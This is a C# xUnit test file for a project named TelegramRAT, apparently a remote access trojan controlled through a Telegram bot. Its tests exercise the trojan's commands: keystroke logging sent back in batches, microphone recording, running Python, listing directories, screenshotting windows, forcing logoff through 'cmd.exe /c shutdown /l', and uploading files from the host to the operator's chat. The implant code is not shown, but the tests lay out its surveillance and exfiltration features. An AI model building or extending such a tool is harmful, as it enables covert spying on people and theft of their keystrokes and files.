using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using Moq;
using NAudio.Wave;
using Telegram.Bot;
using Telegram.Bot.Requests;
using Telegram.Bot.Requests.Abstractions;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types.InputFiles;
using TelegramRAT;
using TelegramRAT.Commands;
using Xunit;

namespace TelegramRAT.Tests;

public class CommandRegistryTests
{
    private static Mock<ITelegramBotClient> CreateBotMock(
        List<string> sentMessages,
        List<SendDocumentRequest>? sentDocuments = null,
        List<SendPhotoRequest>? sentPhotos = null)
    {
        var botMock = new Mock<ITelegramBotClient>(MockBehavior.Strict);

        botMock
            .Setup(b => b.MakeRequest(It.IsAny<IRequest<Message>>(), It.IsAny<CancellationToken>()))
            .Returns<IRequest<Message>, CancellationToken>((request, _) =>
            {
                switch (request)
                {
                    case SendMessageRequest messageRequest:
                        sentMessages.Add(messageRequest.Text);
                        return Task.FromResult(new Message
                        {
                            MessageId = 1,
                            Chat = new Chat { Id = messageRequest.ChatId.Identifier ?? 0 }
                        });
                    case SendDocumentRequest:
                        if (sentDocuments != null)
                            sentDocuments.Add((SendDocumentRequest)request);
                        return Task.FromResult(new Message { MessageId = 1 });
                    case SendPhotoRequest photoRequest:
                        sentPhotos?.Add(photoRequest);
                        return Task.FromResult(new Message { MessageId = 1 });
                    case SendVoiceRequest:
                        return Task.FromResult(new Message { MessageId = 1 });
                    default:
                        return Task.FromResult(new Message { MessageId = 1 });
                }
            });

        botMock
            .Setup(b => b.MakeRequest(It.IsAny<IRequest<bool>>(), It.IsAny<CancellationToken>()))
            .ReturnsAsync(true);

        botMock
            .Setup(b => b.MakeRequest(It.IsAny<IRequest<File>>(), It.IsAny<CancellationToken>()))
            .ReturnsAsync(new File { FileId = "file", FilePath = "UserScript.py" });

        botMock
            .Setup(b => b.MakeRequest(It.IsAny<IRequest<Stream>>(), It.IsAny<CancellationToken>()))
            .ReturnsAsync(Stream.Null);

        return botMock;
    }

    private static BotCommandModel CreateModel(string command, string[]? args = null)
        => new()
        {
            Command = command,
            Args = args ?? Array.Empty<string>(),
            RawArgs = args == null ? string.Empty : string.Join(' ', args),
            Message = new Message
            {
                Chat = new Chat { Id = 123 },
                From = new User { Id = 321, FirstName = "tester" },
                MessageId = 7,
                Date = DateTime.UtcNow
            }
        };

    [Fact]
    public async Task KeylogCommand_WhenAlreadyActive_TogglesOffWithoutRequests()
    {
        var sentMessages = new List<string>();
        var botMock = CreateBotMock(sentMessages);
        Program.SetBotClient(botMock.Object);

        var commands = new List<BotCommand>();
        CommandRegistry.InitializeCommands(commands);
        var command = commands.Single(c => c.Command == "keylog");

        var keylogField = typeof(CommandRegistry).GetField("KeylogActive", BindingFlags.NonPublic | BindingFlags.Static);
        keylogField!.SetValue(null, true);

        var model = CreateModel("keylog");

        await command.Execute(model);

        Assert.False((bool)keylogField.GetValue(null)!);
        Assert.Empty(sentMessages);
        botMock.VerifyNoOtherCalls();
    }

    [Fact]
    public async Task AudioCommand_RespondsImmediatelyWhenUnableToRecord()
    {
        var sentMessages = new List<string>();
        var botMock = CreateBotMock(sentMessages);
        Program.SetBotClient(botMock.Object);

        var commands = new List<BotCommand>();
        CommandRegistry.InitializeCommands(commands);
        var command = commands.Single(c => c.Command == "audio");

        var model = CreateModel("audio", new[] { "invalid" });

        await command.Execute(model);

        Assert.Single(sentMessages);
        var expectedMessage = WaveInEvent.DeviceCount == 0
            ? "This machine has no audio input devices, the recording isn't possible."
            : "Argument must be a positive integer!";
        Assert.Equal(expectedMessage, sentMessages[0]);
    }

    [Fact]
    public async Task PythonCommand_WithNoArguments_PromptsForInput()
    {
        var sentMessages = new List<string>();
        var botMock = CreateBotMock(sentMessages);
        Program.SetBotClient(botMock.Object);

        var commands = new List<BotCommand>();
        CommandRegistry.InitializeCommands(commands);
        var command = commands.Single(c => c.Command == "py");

        var model = CreateModel("py");

        await command.Execute(model);

        Assert.Single(sentMessages);
        Assert.Equal("Need an expression or file to execute", sentMessages[0]);
    }

    [Fact]
    public async Task CdCommand_WithQuotedPathChangesDirectory()
    {
        var sentMessages = new List<string>();
        var botMock = CreateBotMock(sentMessages);
        Program.SetBotClient(botMock.Object);

        var commands = new List<BotCommand>();
        CommandRegistry.InitializeCommands(commands);
        var command = commands.Single(c => c.Command == "cd");

        var originalDirectory = Directory.GetCurrentDirectory();
        var tempRoot = Path.Combine(Path.GetTempPath(), "TelegramRAT Tests", Guid.NewGuid().ToString());
        var targetDirectory = Path.Combine(tempRoot, "Program Files");
        Directory.CreateDirectory(targetDirectory);

        try
        {
            var model = new BotCommandModel
            {
                Command = "cd",
                Args = new[] { targetDirectory },
                RawArgs = $"\"{targetDirectory}\"",
                Message = new Message
                {
                    Chat = new Chat { Id = 123 },
                    From = new User { Id = 321, FirstName = "tester" },
                    MessageId = 7,
                    Date = DateTime.UtcNow
                }
            };

            await command.Execute(model);

            var expectedDirectory = Path.GetFullPath(targetDirectory);
            var actualDirectory = Directory.GetCurrentDirectory();
            var comparison = RuntimeInformation.IsOSPlatform(OSPlatform.Windows)
                ? StringComparison.OrdinalIgnoreCase
                : StringComparison.Ordinal;

            Assert.True(string.Equals(expectedDirectory, actualDirectory, comparison));
            Assert.Single(sentMessages);
            Assert.Contains(expectedDirectory, sentMessages[0]);
        }
        finally
        {
            Directory.SetCurrentDirectory(originalDirectory);

            if (Directory.Exists(tempRoot))
                Directory.Delete(tempRoot, recursive: true);
        }
    }


    [Fact]
    public async Task WindowCommand_Info_AllowsTitlesWithSpaces()
    {
        var sentMessages = new List<string>();
        var sentPhotos = new List<SendPhotoRequest>();
        var botMock = CreateBotMock(sentMessages, sentPhotos: sentPhotos);
        Program.SetBotClient(botMock.Object);

        var commands = new List<BotCommand>();
        CommandRegistry.InitializeCommands(commands);
        var command = commands.Single(c => c.Command == "window");

        var expectedTitle = "My App Window";
        var fakeHandle = new IntPtr(0x1234);
        var fakeProcessHandle = new IntPtr(0x5678);

        var originalFinder = CommandRegistry.WindowFinder;
        var originalForeground = CommandRegistry.ForegroundWindowGetter;
        var originalValidator = CommandRegistry.WindowValidator;
        var originalBounds = CommandRegistry.WindowBoundsGetter;
        var originalTitle = CommandRegistry.WindowTitleGetter;
        var originalProcessHandle = CommandRegistry.ProcessHandleFromWindow;
        var originalProcessId = CommandRegistry.ProcessIdGetter;
        var originalCapture = CommandRegistry.WindowCapture;

        try
        {
            CommandRegistry.WindowFinder = (className, caption) =>
                caption == expectedTitle ? fakeHandle : IntPtr.Zero;
            CommandRegistry.ForegroundWindowGetter = () => fakeHandle;
            CommandRegistry.WindowValidator = handle => handle == fakeHandle;
            CommandRegistry.WindowBoundsGetter = _ => new Rectangle(10, 20, 300, 400);
            CommandRegistry.WindowTitleGetter = _ => expectedTitle;
            CommandRegistry.ProcessHandleFromWindow = _ => fakeProcessHandle;
            CommandRegistry.ProcessIdGetter = _ => 4242;
            CommandRegistry.WindowCapture = (handle, stream) => stream.WriteByte(0);

            var model = CreateModel("window", new[] { "info", "My", "App", "Window" });

            await command.Execute(model);

            Assert.Empty(sentMessages);
            var photoRequest = Assert.Single(sentPhotos);
            Assert.Contains(expectedTitle, photoRequest.Caption);
            var inputFile = Assert.IsType<InputFileStream>(photoRequest.Photo);
            Assert.True(inputFile.Content.Length > 0);
        }
        finally
        {
            CommandRegistry.WindowFinder = originalFinder;
            CommandRegistry.ForegroundWindowGetter = originalForeground;
            CommandRegistry.WindowValidator = originalValidator;
            CommandRegistry.WindowBoundsGetter = originalBounds;
            CommandRegistry.WindowTitleGetter = originalTitle;
            CommandRegistry.ProcessHandleFromWindow = originalProcessHandle;
            CommandRegistry.ProcessIdGetter = originalProcessId;
            CommandRegistry.WindowCapture = originalCapture;
        }
    }

    [Fact]
    public async Task WindowCommand_Info_AllowsHexPointerBeyondInt32()
    {
        var sentMessages = new List<string>();
        var sentPhotos = new List<SendPhotoRequest>();
        var botMock = CreateBotMock(sentMessages, sentPhotos: sentPhotos);
        Program.SetBotClient(botMock.Object);

        var commands = new List<BotCommand>();
        CommandRegistry.InitializeCommands(commands);
        var command = commands.Single(c => c.Command == "window");

        const long pointerValue = 0x80000000;
        var expectedHandle = new IntPtr(pointerValue);

        var originalValidator = CommandRegistry.WindowValidator;
        var originalBounds = CommandRegistry.WindowBoundsGetter;
        var originalTitle = CommandRegistry.WindowTitleGetter;
        var originalProcessHandle = CommandRegistry.ProcessHandleFromWindow;
        var originalProcessId = CommandRegistry.ProcessIdGetter;
        var originalCapture = CommandRegistry.WindowCapture;

        try
        {
            CommandRegistry.WindowValidator = handle => handle == expectedHandle;
            CommandRegistry.WindowBoundsGetter = _ => new Rectangle(0, 0, 100, 100);
            CommandRegistry.WindowTitleGetter = _ => "Pointer Window";
            CommandRegistry.ProcessHandleFromWindow = _ => new IntPtr(1234);
            CommandRegistry.ProcessIdGetter = _ => 5678;
            CommandRegistry.WindowCapture = (handle, stream) => stream.WriteByte(1);

            var pointerArgument = $"0x{pointerValue:X}";
            var model = CreateModel("window", new[] { "info", pointerArgument });

            await command.Execute(model);

            Assert.Empty(sentMessages);
            var photoRequest = Assert.Single(sentPhotos);
            Assert.Contains(pointerArgument[2..], photoRequest.Caption);
        }
        finally
        {
            CommandRegistry.WindowValidator = originalValidator;
            CommandRegistry.WindowBoundsGetter = originalBounds;
            CommandRegistry.WindowTitleGetter = originalTitle;
            CommandRegistry.ProcessHandleFromWindow = originalProcessHandle;
            CommandRegistry.ProcessIdGetter = originalProcessId;
            CommandRegistry.WindowCapture = originalCapture;
        }
    }

    [Fact]
    public async Task PowerCommand_Logoff_UsesShutdownLogoff()
    {
        var sentMessages = new List<string>();
        var botMock = CreateBotMock(sentMessages);
        Program.SetBotClient(botMock.Object);

        var commands = new List<BotCommand>();
        CommandRegistry.InitializeCommands(commands);
        var command = commands.Single(c => c.Command == "power");

        var originalStarter = CommandRegistry.ProcessStarter;
        ProcessStartInfo? capturedStartInfo = null;

        try
        {
            CommandRegistry.ProcessStarter = info =>
            {
                capturedStartInfo = info;
                return null;
            };

            var model = CreateModel("power", new[] { "logoff" });

            await command.Execute(model);
        }
        finally
        {
            CommandRegistry.ProcessStarter = originalStarter;
        }

        Assert.Single(sentMessages);
        Assert.Equal("Done!", sentMessages[0]);

        Assert.NotNull(capturedStartInfo);
        Assert.Equal("cmd.exe", capturedStartInfo!.FileName);
        Assert.Equal("/c shutdown /l", capturedStartInfo.Arguments);
        Assert.True(capturedStartInfo.CreateNoWindow);
    }

    [Fact]
    public async Task DownloadCommand_WithRelativePath_SendsFileFromCurrentDirectory()
    {
        var sentMessages = new List<string>();
        var sentDocuments = new List<SendDocumentRequest>();
        var botMock = CreateBotMock(sentMessages, sentDocuments);
        Program.SetBotClient(botMock.Object);

        var commands = new List<BotCommand>();
        CommandRegistry.InitializeCommands(commands);
        var command = commands.Single(c => c.Command == "download");

        var originalDirectory = Directory.GetCurrentDirectory();
        var tempRoot = Path.Combine(Path.GetTempPath(), "TelegramRAT Tests", Guid.NewGuid().ToString());
        var targetDirectory = Path.Combine(tempRoot, "nested");
        var fileName = "relative.txt";
        var relativePath = Path.Combine("nested", fileName);
        Directory.CreateDirectory(targetDirectory);
        var fullPath = Path.Combine(targetDirectory, fileName);
        await File.WriteAllTextAsync(fullPath, "content");

        try
        {
            Directory.SetCurrentDirectory(tempRoot);

            var model = CreateModel("download", new[] { relativePath });

            await command.Execute(model);

            Assert.Empty(sentMessages);
            var documentRequest = Assert.Single(sentDocuments);
            var inputFile = Assert.IsType<InputFileStream>(documentRequest.Document);
            var fileStream = Assert.IsType<FileStream>(inputFile.Content);
            Assert.Equal(Path.GetFullPath(fullPath), Path.GetFullPath(fileStream.Name));
        }
        finally
        {
            Directory.SetCurrentDirectory(originalDirectory);

            if (Directory.Exists(tempRoot))
                Directory.Delete(tempRoot, recursive: true);
        }
    }

    [Fact]
    public async Task DownloadCommand_WithAbsolutePath_SendsFile()
    {
        var sentMessages = new List<string>();
        var sentDocuments = new List<SendDocumentRequest>();
        var botMock = CreateBotMock(sentMessages, sentDocuments);
        Program.SetBotClient(botMock.Object);

        var commands = new List<BotCommand>();
        CommandRegistry.InitializeCommands(commands);
        var command = commands.Single(c => c.Command == "download");

        var originalDirectory = Directory.GetCurrentDirectory();
        var tempRoot = Path.Combine(Path.GetTempPath(), "TelegramRAT Tests", Guid.NewGuid().ToString());
        Directory.CreateDirectory(tempRoot);
        var filePath = Path.Combine(tempRoot, "absolute.txt");
        await File.WriteAllTextAsync(filePath, "content");

        try
        {
            Directory.SetCurrentDirectory(originalDirectory);

            var model = CreateModel("download", new[] { filePath });

            await command.Execute(model);

            Assert.Empty(sentMessages);
            var documentRequest = Assert.Single(sentDocuments);
            var inputFile = Assert.IsType<InputFileStream>(documentRequest.Document);
            var fileStream = Assert.IsType<FileStream>(inputFile.Content);
            Assert.Equal(Path.GetFullPath(filePath), Path.GetFullPath(fileStream.Name));
        }
        finally
        {
            Directory.SetCurrentDirectory(originalDirectory);

            if (Directory.Exists(tempRoot))
                Directory.Delete(tempRoot, recursive: true);
        }
    }

    [Fact]
    public async Task KeylogCommand_StreamsBatchesAndTrimsSnippet()
    {
        var sentMessages = new List<string>();
        string? capturedDocument = null;

        var botMock = new Mock<ITelegramBotClient>(MockBehavior.Strict);

        botMock
            .Setup(b => b.MakeRequest(It.IsAny<IRequest<Message>>(), It.IsAny<CancellationToken>()))
            .Returns<IRequest<Message>, CancellationToken>((request, _) =>
            {
                switch (request)
                {
                    case SendMessageRequest messageRequest:
                        sentMessages.Add(messageRequest.Text);
                        return Task.FromResult(new Message
                        {
                            MessageId = 1,
                            Chat = new Chat { Id = messageRequest.ChatId.Identifier ?? 0 }
                        });
                    case SendDocumentRequest documentRequest:
                    {
                        if (documentRequest.Document is InputFileStream inputFileStream)
                        {
                            if (inputFileStream.Content.CanSeek)
                                inputFileStream.Content.Position = 0;
                            using var reader = new StreamReader(inputFileStream.Content, leaveOpen: true);
                            capturedDocument = reader.ReadToEnd();
                            if (inputFileStream.Content.CanSeek)
                                inputFileStream.Content.Position = 0;
                        }

                        return Task.FromResult(new Message { MessageId = 1 });
                    }
                    default:
                        return Task.FromResult(new Message { MessageId = 1 });
                }
            });

        botMock
            .Setup(b => b.MakeRequest(It.IsAny<IRequest<bool>>(), It.IsAny<CancellationToken>()))
            .ReturnsAsync(true);

        botMock
            .Setup(b => b.MakeRequest(It.IsAny<IRequest<File>>(), It.IsAny<CancellationToken>()))
            .ReturnsAsync(new File { FileId = "file", FilePath = "UserScript.py" });

        botMock
            .Setup(b => b.MakeRequest(It.IsAny<IRequest<Stream>>(), It.IsAny<CancellationToken>()))
            .ReturnsAsync(Stream.Null);

        Program.SetBotClient(botMock.Object);

        var commands = new List<BotCommand>();
        CommandRegistry.InitializeCommands(commands);
        var command = commands.Single(c => c.Command == "keylog");

        var keylogField = typeof(CommandRegistry).GetField("KeylogActive", BindingFlags.NonPublic | BindingFlags.Static);
        keylogField!.SetValue(null, false);

        var providerField = typeof(CommandRegistry).GetField("KeylogKeyProvider", BindingFlags.NonPublic | BindingFlags.Static);
        var mapperField = typeof(CommandRegistry).GetField("KeylogKeyMapper", BindingFlags.NonPublic | BindingFlags.Static);

        var originalProvider = (Func<List<uint>>)providerField!.GetValue(null)!;
        var originalMapper = (Func<uint, char>)mapperField!.GetValue(null)!;

        try
        {
            var sequences = new Queue<List<uint>>();
            for (int i = 0; i < 8; i++)
            {
                sequences.Enqueue(Enumerable.Repeat(65u, 600).ToList());
                sequences.Enqueue(new List<uint>());
            }

            providerField.SetValue(null, new Func<List<uint>>(() =>
            {
                if (sequences.Count == 0)
                {
                    return new List<uint>();
                }

                return sequences.Dequeue();
            }));

            mapperField.SetValue(null, new Func<uint, char>(_ => 'A'));

            var model = CreateModel("keylog");

            var executeTask = command.Execute(model);

            await Task.Delay(1000);
            keylogField.SetValue(null, false);

            await executeTask;

            var snippetMessage = sentMessages.Last(message => message.StartsWith("Keylog from "));
            var snippet = snippetMessage.Substring(snippetMessage.LastIndexOf('\n') + 1);

            Assert.True(snippet.Length <= 1024);
            Assert.True(snippet.Length >= 900);

            Assert.False(string.IsNullOrEmpty(capturedDocument));
            Assert.Contains("Mapped:", capturedDocument);
            Assert.Contains("Unmapped:", capturedDocument);
        }
        finally
        {
            providerField.SetValue(null, originalProvider);
            mapperField.SetValue(null, originalMapper);
            keylogField.SetValue(null, false);
        }
    }

    [Fact]
    public async Task DirCommand_WithNoArguments_ListsCurrentDirectoryContents()
    {
        var sentMessages = new List<string>();
        var botMock = CreateBotMock(sentMessages);
        Program.SetBotClient(botMock.Object);

        var commands = new List<BotCommand>();
        CommandRegistry.InitializeCommands(commands);
        var command = commands.Single(c => c.Command == "dir");

        var originalDirectory = Directory.GetCurrentDirectory();
        var tempRoot = Path.Combine(Path.GetTempPath(), "TelegramRAT Tests", Guid.NewGuid().ToString());
        var expectedFile = Path.Combine(tempRoot, "file.txt");
        var expectedDirectory = Path.Combine(tempRoot, "folder");

        Directory.CreateDirectory(tempRoot);
        Directory.CreateDirectory(expectedDirectory);
        await File.WriteAllTextAsync(expectedFile, "data");

        try
        {
            Directory.SetCurrentDirectory(tempRoot);

            var model = CreateModel("dir");

            await command.Execute(model);

            Assert.NotEmpty(sentMessages);
            var message = sentMessages.Single();
            Assert.Contains("<b>Files:</b>", message);
            Assert.Contains("file.txt", message);
            Assert.Contains("folder", message);
        }
        finally
        {
            Directory.SetCurrentDirectory(originalDirectory);

            if (Directory.Exists(tempRoot))
                Directory.Delete(tempRoot, recursive: true);
        }
    }

    [Fact]
    public async Task DirCommand_WithExplicitPath_UsesProvidedDirectory()
    {
        var sentMessages = new List<string>();
        var botMock = CreateBotMock(sentMessages);
        Program.SetBotClient(botMock.Object);

        var commands = new List<BotCommand>();
        CommandRegistry.InitializeCommands(commands);
        var command = commands.Single(c => c.Command == "dir");

        var originalDirectory = Directory.GetCurrentDirectory();
        var tempRoot = Path.Combine(Path.GetTempPath(), "TelegramRAT Tests", Guid.NewGuid().ToString());
        var currentDirectory = Path.Combine(tempRoot, "current");
        var targetDirectory = Path.Combine(tempRoot, "target path");
        var unexpectedFile = Path.Combine(currentDirectory, "current.txt");
        var expectedFile = Path.Combine(targetDirectory, "target.txt");

        Directory.CreateDirectory(currentDirectory);
        Directory.CreateDirectory(targetDirectory);
        await File.WriteAllTextAsync(unexpectedFile, "current");
        await File.WriteAllTextAsync(expectedFile, "target");

        try
        {
            Directory.SetCurrentDirectory(currentDirectory);

            var model = new BotCommandModel
            {
                Command = "dir",
                Args = new[] { targetDirectory },
                RawArgs = targetDirectory,
                Message = new Message
                {
                    Chat = new Chat { Id = 123 },
                    From = new User { Id = 321, FirstName = "tester" },
                    MessageId = 7,
                    Date = DateTime.UtcNow
                }
            };

            await command.Execute(model);

            Assert.NotEmpty(sentMessages);
            var message = sentMessages.Single();
            Assert.Contains("target.txt", message);
            Assert.DoesNotContain("current.txt", message);
        }
        finally
        {
            Directory.SetCurrentDirectory(originalDirectory);

            if (Directory.Exists(tempRoot))
                Directory.Delete(tempRoot, recursive: true);
        }
    }
}
